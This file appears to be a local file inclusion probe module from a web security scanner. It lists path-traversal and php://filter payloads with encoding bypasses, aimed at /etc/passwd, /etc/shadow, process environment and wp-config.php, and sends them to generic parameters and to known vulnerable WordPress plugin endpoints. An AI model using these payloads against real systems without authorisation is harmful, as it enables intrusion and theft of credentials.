import type { Finding, ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, parallelProbe} from '../utils.js';

const MODULE_NAME = 'Local File Inclusion (LFI) Probe';

// Encode like Python's quote(s, safe="%/.")
function quoteSafe(s: string, safe: string): string {
  return s.split('').map(c => {
    if (safe.includes(c) || /[A-Za-z0-9\-_~]/.test(c)) return c;
    return encodeURIComponent(c);
  }).join('');
}

const TARGET_FILES: [string, string][] = [
  ['../../../../../../../etc/passwd',                                      'root:'],
  ['../../../../../../../etc/shadow',                                      'root:'],
  ['../../../../../../../proc/self/environ',                               'PATH='],
  ['../../../../../../../wp-config.php',                                   'DB_PASSWORD'],
  ['%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',                  'root:'],
  ['....//....//....//....//etc/passwd',                                   'root:'],
  ['..%252f..%252f..%252f..%252fetc%252fpasswd',                          'root:'],
  ['..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd',                         'root:'],
  ['php://filter/convert.base64-encode/resource=../wp-config.php',        'DB_'],
  ['php://filter/read=convert.base64-encode/resource=/etc/passwd',        'cm9vdD'],
];

const VULNERABLE_PARAMS: [string, string][] = [
  ['/?file={payload}',       'file_param'],
  ['/?page={payload}',       'page_param'],
  ['/?template={payload}',   'template_param'],
  ['/?inc={payload}',        'inc_param'],
  ['/?include={payload}',    'include_param'],
  ['/?path={payload}',       'path_param'],
  ['/?dir={payload}',        'dir_param'],
  ['/?page=../{payload}',    'page_dotdot'],
  ['/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php?cmd=info&target={payload}',
    'wp_file_manager'],
  ['/wp-content/plugins/cherry-plugin/includes/manage-options.php?basepath={payload}',
    'cherry_plugin'],
  ['/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php?ajax=1&action=sam_load_data&data={payload}',
    'simple_ads_manager'],
  ['/wp-content/themes/twentyfifteen/genericons/example.html?{payload}',
    'twentyfifteen_example'],
];

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: Finding[] = [];
  const errors: string[] = [];

  try {
    // Flatten [param, file] combos — all run in parallel
    const hitParams = new Set<string>();
    const combos: [string, string, string, string][] = [];
    for (const [endpointTemplate, label] of VULNERABLE_PARAMS) {
      for (const [payload, indicator] of TARGET_FILES) {
        combos.push([endpointTemplate, label, payload, indicator]);
      }
    }
    await parallelProbe(combos, async ([endpointTemplate, label, payload, indicator]) => {
      if (hitParams.has(label)) return;
      const encoded = quoteSafe(payload, '%/.');
      const url = target + endpointTemplate.replace('{payload}', encoded);
      const res = await fetchURL(url);
      if (!res) return;
      if (res.status !== 200) return;

      let body: string;
      try { body = await res.text(); } catch { return; }

      // Skip normal HTML pages — LFI responses should not be full HTML documents
      const isHtmlPage = body.includes('<!DOCTYPE') || body.includes('<html') || body.includes('<!doctype');

      if (body.toLowerCase().includes(indicator.toLowerCase())) {
        // Require stronger evidence to avoid false positives:
        // - For 'root:' indicator, body must contain 'root:x:0:' (actual /etc/passwd format)
        // - For 'PATH=' indicator, body must also contain 'HOME=' or 'SHELL=' (actual environ output)
        // - For 'DB_PASSWORD' / 'DB_' indicators, body must not be a normal HTML page
        // - For base64 'cm9vdD' indicator, body should contain the base64 block
        let confirmed = false;
        if (indicator === 'root:') {
          confirmed = body.includes('root:x:0:') || body.includes('root:*:0:');
        } else if (indicator === 'PATH=') {
          confirmed = !isHtmlPage && (body.includes('HOME=') || body.includes('SHELL=') || body.includes('USER='));
        } else if (indicator === 'DB_PASSWORD' || indicator === 'DB_') {
          confirmed = !isHtmlPage && body.includes('DB_PASSWORD');
        } else if (indicator === 'cm9vdD') {
          confirmed = !isHtmlPage && body.includes('cm9vdDp4OjA6');
        } else {
          confirmed = !isHtmlPage;
        }

        if (confirmed) {
          hitParams.add(label);
          findings.push(finding(
          'LFI_CONFIRMED',
          'CRITICAL',
          url,
          `LFI confirmed via '${label}' — '${indicator}' found in response`,
          { evidence: `payload: ${payload}; indicator: ${indicator}`, remediation: 'Never use user input directly in file paths. Use a whitelist of allowed files.' },
        ));
        }
      }
    }, 30);
  } catch (e) {
    errors.push(String(e));
  }

  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
